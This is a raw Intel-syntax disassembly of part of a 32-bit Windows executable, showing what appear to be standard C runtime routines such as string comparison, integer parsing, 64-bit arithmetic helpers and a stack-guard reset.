  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
